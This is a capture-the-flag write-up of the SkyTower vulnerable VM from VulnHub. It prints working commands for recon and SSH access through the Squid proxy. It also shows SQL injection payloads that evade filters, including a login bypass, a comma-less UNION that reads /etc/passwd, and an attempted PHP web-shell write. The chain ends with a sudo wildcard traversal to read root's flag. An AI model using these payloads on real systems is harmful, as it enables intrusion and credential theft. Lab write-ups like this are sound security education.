---
categories:
- CTF
- Vulnerable VM
- Solution
- Challenge
comments: true
date: 2014-07-17T18:20:12Z
title: Climbing the SkyTower
---

## foreword
Recently, at a local Security Conference, [@telspacesystems](https://twitter.com/telspacesystems) ran a CTF. It was a classic 'read /root/flag.txt' CTF hosted on a wireless network. Sadly the wifi sucked, a lot, and due to this and a flat battery I was not able to attempt this CTF properly at the con. Nonetheless, the VM was released on [VulnHub](http://vulnhub.com/entry/skytower-1,96/), and was promptly downloaded and loaded into VirtualBox.

In summary, this CTF taught me some interesting things about SQL injection where filters are present. More specifically, commas were filtered out and resulted in the need from some creative thinking :)

<!--more-->

## starting off
The very first thing to do was get the IP assigned by my home router to the VM. Loaded this up into a web browser and saw the skytower web page as per the screenshots in the vulnhub entry. The IP I got was 192.168.137.242.

The home page presented you with a login screen and a 2.5MB 'background.jpg' image. Right in the beginning I was started off on the wrong path. I downloaded this background image and attempted to see if there was anything particularly interesting about it. Sadly, the answer to this question was a loud *NOPE*. I started dirbuster on the web interface and proceeded with a nmap scan of 192.168.137.242 after which I had to call it a night.

```bash
$ nmap --reason -Pn 192.168.137.242

Starting Nmap 6.46 ( http://nmap.org ) at 2014-07-17 18:32 SAST
Nmap scan report for 192.168.137.242
Host is up, received user-set (0.0020s latency).
Not shown: 997 closed ports
Reason: 997 conn-refused
PORT     STATE    SERVICE    REASON
22/tcp   filtered ssh        no-response
80/tcp   open     http       syn-ack
3128/tcp open     squid-http syn-ack
```

Next morning I reviewed the results and continued to poke around.

## learn all you can
With the information gathered so far, I realized that the SSH (tcp/22) was explicitly filtered, however the squid proxy was open. I tried to telnet and use the CONNECT method to see if I was able to access the SSH service:

```bash
$ telnet 192.168.137.242 3128
Trying 192.168.137.242...
Connected to 192.168.137.242.
Escape character is '^]'.
CONNECT 127.0.0.1:22
HTTP/1.0 200 Connection established

SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u1
^]
telnet> quit
Connection closed.
```

Great, soooo I can get access to the SSH service of needed. The dirbuster results showed nothing of particular interest, but it was worth a shot anyways. An important thing to note here is that I suspect I maxed out the disk space in the VM due to the access_log growing too big from the dirbust. This caused me numerous headaches and frustrated me quite a bit when I was testing. Anyways...

The next step was to poke around the web application. I personally really enjoy web hacking so this was probably the most fun of the whole CTF. The web page presented you with a simple form that would POST to `login.php`. 2 fields were posted: `email` & `password`

A natural reaction is to try and use a single quote in form fields as a quick and nasty check for potential SQL injection. A login attempt with a username of test and password `'` resulted in:

```bash
There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1]
```

Classic SQLi! Surprised I continued with simple login bypasses. None that I could think of out of my head appeared to work. Eventually I started to notice that some of the keywords that I was using were not appearing in the error messages. This hinted heavily towards the fact that there may be some form of filtering in place. Eventually, I put the request down in a curl command so that I can work with this slightly easier. To sample the keywords being removed:

```bash
$ curl --data "email=foo@bar&password=' OR 1=1#" http://192.168.137.242/login.php
There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '11#'' at line 1]%

$ curl --data "email=foo@bar&password='1 OR 1=1#" http://192.168.137.242/login.php
There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1  11#'' at line 1]%
```

Ok, so no `OR`. Thats ok, we can substitute this easily with `||`.

```html
$ curl --data "email=foo@bar&password=' || 1=1#" http://192.168.137.242/login.php
<HTML>
      <div style="height:100%; width:100%;background-image:url('background.jpg');
                                background-size:100%;
                                background-position:50% 50%;
                                background-repeat:no-repeat;">
      <div style="
        padding-right:8px;
              padding-left:10px;
        padding-top: 10px;
              padding-bottom: 10px;
                  background-color:white;
                  border-color: #000000;
                  border-width: 5px;
                  border-style: solid;
                  width: 400px;
                  height:430px;
                  position:absolute;
                  top:50%;
                  left:50%;
                  margin-top:-215px; /* this is half the height of your div*/
                  margin-left:-200px;
                                ">
   <br><strong><font size=4>Welcome john@skytech.com</font><br /> </br></strong>As you may know, SkyTech has ceased all international operations.<br><br> To all our long term employees, we wish to convey our thanks for your dedication and hard work.<br><br><strong>Unfortunately, all international contracts, including yours have been terminated.</strong><br><br> The remainder of your contract and retirement fund, <strong>$2</strong> ,has been payed out in full to a secure account.  For security reasons, you must login to the SkyTech server via SSH to access the account details.<br><br><strong>Username: john</strong><br><strong>Password: hereisjohn</strong> <br><br> We wish you the best of luck in your future endeavors. <br> </div> </div></HTML>%
```

And success. We have made some progress :D Little did I know that I don't actually completely understand the progress made yet, but just keep this in mind :)

## climbing the tower and faling hard
From the auth bypass results, we can see specific mention for users to SSH into the server. This particular user has a username `john` and a password `hereisjohn`. So lets try this.
I setup my `proxychains` install to use the http proxy available on the server (`http 192.168.137.242 3128`) and opened a SSH session through it:

```bash
$ proxychains4 ssh john@127.0.0.1
[snip]
[proxychains] Strict chain  ...  192.168.137.242:3128  ...  127.0.0.1:22  ...  OK
john@127.0.0.1's password:
Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jul 17 12:54:32 2014 from localhost

Funds have been withdrawn
Connection to 127.0.0.1 closed.
$
```

... ok. So we get a session, and are told _Funds have been withdrawn_, and get the connection closed. Not exactly what I hoped for. Thinking what could cause this behavior, my mind went on to things like a custom shell, `.bashrc` files (assuming the user has bash a a shell) etc. So, I figured there may be more users on the system and I should try get those credentials too. After all, we have a working SQL injection point.

## more sql injection
So back to the SQLi point it was. Taking a wild guess, I assumed there is a `users` table, and the table will have a primary key of `id`. So, `john` may have id 1, and a next user have id 2. So I modified the query slightly:

```bash
$ curl --data "email=foo@bar&password=' || id=1#" http://192.168.137.242/login.php
There was an error running the query [Unknown column 'id1' in 'where clause']%
```

Well I definitely didn't ask for the column `id1`, but from this again it was apparent that `=` was filtered along with `OR`. :| Ok, so we change the payload again:

```bash
$ curl --data "email=foo@bar&password=' || id > 1#" http://192.168.137.242/login.php
[snip]
<br><strong><font size=4>Welcome sara@skytech.com</font><br /> </br></strong>As you may know, SkyTech has ceased all international operations.<br><br> To all our long term employees, we wish to convey our thanks for your dedication and hard work.<br><br><strong>Unfortunately, all international contracts, including yours have been terminated.</strong><br><br> The remainder of your contract and retirement fund, <strong>$2</strong> ,has been payed out in full to a secure account.  For security reasons, you must login to the SkyTech server via SSH to access the account details.<br><br><strong>Username: sara</strong><br><strong>Password: ihatethisjob</strong> <br><br> We wish you the best of luck in your future endeavors. <br> </div> </div></HTML>%
```

Yay, my guess on the `id` column was correct, and I now had a second users details. I continued to increment the `id`, and ended up with 3 accounts:

- john:hereisjohn
- sara:ihatethisjob
- william:senseable

The users `john` & `sara` both had the same behavior when attempting login via SSH, and the user `william` appears to have had an incorrect password. So, again the results were not exactly what I hoped for.

## more SQL enumeration
At this stage, I was thinking there must be more information in the database, and I should try and read some files from disk in order to gain a better understanding of what is going on here.

Fast forward a few hours, I discovered that a few more keywords and symbols were filtered. The hardest being the realization that a `union select` was not working as expected so that I can enumerate the columns. Even though the initial entry on vulnhub mentioned that automated tools would probably not work, I figured in this case that I had a valid SQLi, I could just make use of some SQLMap automagic. Again *NOPE*. Even with `--level 3` & `--risk 3` there was no joy. This is ok.

I studied the error messages in detail, googled... a lot... and eventually came across [this](http://zoczus.blogspot.nl/2013/03/sql-injection-without-comma-char.html) blogpost, detailing a way to get a union working without the ability to use commas. I should also note that I managed to bypass the `SELECT` filter by using `SELECSELECTT` in the payload. Assuming that the filter was a simple `str_replace()`, this left me with `SELECT` after the pass.

For the sake of brevity I am not going to detail all of the methods I used in order to exploit the SQLi and get value out of it. I managed to learn that the database user used by the PHP application was root. The query used in `login.php` returned 3 columns. One particular payload of interest that uses the method in the previously mentioned blog post, was used to start reading files from the servers disk. More specifically, `/etc/passwd`:

```bash
$ curl --data "email=foo@bar&password=' or union selecselectt * from (selecselectt 111) as a JOIN (selecselectt 222) as b JOIN (selecselectt load_file('/etc/password')) as c#" http://192.168.137.242/login.php
[snip]
<br><strong><font size=4>Welcome 222</font><br /> </br></strong>As you may know, SkyTech has ceased all international operations.<br><br> To all our long term employees, we wish to convey our thanks for your dedication and hard work.<br><br><strong>Unfortunately, all international contracts, including yours have been terminated.</strong><br><br> The remainder of your contract and retirement fund, <strong>$2</strong> ,has been payed out in full to a secure account.  For security reasons, you must login to the SkyTech server via SSH to access the account details.<br><br><strong>Username: 222</strong><br><strong>Password: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
sshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin
mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
john:x:1000:1000:john,,,:/home/john:/bin/bash
sara:x:1001:1001:,,,:/home/sara:/bin/bash
william:x:1002:1002:,,,:/home/william:/bin/bash
</strong> <br><br> We wish you the best of luck in your future endeavors. <br> </div> </div></HTML>
```

Reading the `/etc/passwd` revealed that there were no custom shells used for the users that were enumerated previously. O..k.. I also pulled the sources of `login.php` in order to understand what the deal with the filtering was:

```php
$sqlinjection = array("SELECT", "TRUE", "FALSE", "--","OR", "=", ",", "AND", "NOT");
$email = str_ireplace($sqlinjection, "", $_POST['email']);
$password = str_ireplace($sqlinjection, "", $_POST['password']);
```

And as suspected. :)

One last thing that I tried, really hard, was to get a web shell on the server so that I can further explore the environment. This failed miserably. The closest I was able to get was:

```bash
$ curl --data "email=foo@bar&password=' or union selecselectt * from (selecselectt 111) as a JOIN (selecselectt 222) as b JOIN (selecselectt '<?php print_r(shell_exec($_GET[cmd])); ?>') as c into outfile '/var/www/shell.php'#" http://192.168.137.242/login.php
There was an error running the query [Can't create/write to file '/var/www/shell.php' (Errcode: 13)]
```

This obviously alludes to the fact that the user MySQL is running as des not have access to write to the web folder. It was time to rethink what was going on here...
Oh yes, I obviously tried to just cat `/root/flag.txt`, but didn’t expect it to be *that* easy :D

## gaining further access
After spending a really long time with the SQL injections, I decided to relook the SSH section. From the SQL injection that I learnt that there don't _appear_ to be any custom shells in use, so the other thing this could be is a `.bashrc` with a `exit` command. I know its `.bashrc` because I saw the shell is `/bin/bash` from the `/etc/passwd`. I remember that I make heavy use of `ssh -t` to execute commands on the remove server, usually to setup multiple tunnels into a network, so I thought it will come in handy here.

For this case though, I though I'd specify a `/bin/sh` as the _command_ to run, hoping to not get caught in a `.bashrc` running:

```bash
$ proxychains4 -q ssh john@127.0.0.1 -t /bin/sh
john@127.0.0.1's password:
$ id
uid=1000(john) gid=1000(john) groups=1000(john)
```

Woop! I was now logged in as `john`. I inspected the `.bashrc` file and saw that at the end there was:

```bash
echo
echo  "Funds have been withdrawn"
exit
```

... a exit. I simply removed the line. Now the almost obvious next step was to inspect and enumerate as much as possible. The most obvious thing that came to mind was privilege escalation as I was simply a normal user on the system at the moment.

## enumeration enumeration enumeration
I enumerated, everything... Referring to a excellent [post by g0tm1lk](http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) nothing aparent came up. The only semi strange thing was a empty `/accounts/` directory:

```bash
john@SkyTower:/accounts$ ls -lah /accounts/
total 8.0K
drwxr-xr-x  2 root root 4.0K Jun 20 07:52 .
drwxr-xr-x 24 root root 4.0K Jun 20 07:52 ..
```

Other than that things seemed pretty normal. I decided to check out the other user `sara` too. This user has a similar `exit` in the `.bashrc` which I just removed. There was one distinct difference during enumeration though...

```bash
sara@SkyTower:~$ sudo -l
Matching Defaults entries for sara on this host:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sara may run the following commands on this host:
    (root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/*
```

This user may execute some commands as root using `sudo`. `sudo` allows you to specify what those commands are, if not all. There was one problem with this configuration though. `*` is a wildcard character, and as such, anything after `cat /accounts/` may also be run. This means that things like `sudo cat /accounts/../../etc/shadow` will work as the wildcard allows us to do a form of directory traversal.

## pwnd

So, to complete SkyTower:

```bash
sara@SkyTower:~$ sudo cat /accounts/../../root/flag.txt
Congratz, have a cold one to celebrate!
root password is theskytower
```

Thanks to [@telspacesystems](https://twitter.com/telspacesystems) for the fun experience. I learnt something so for this was totally worth it!
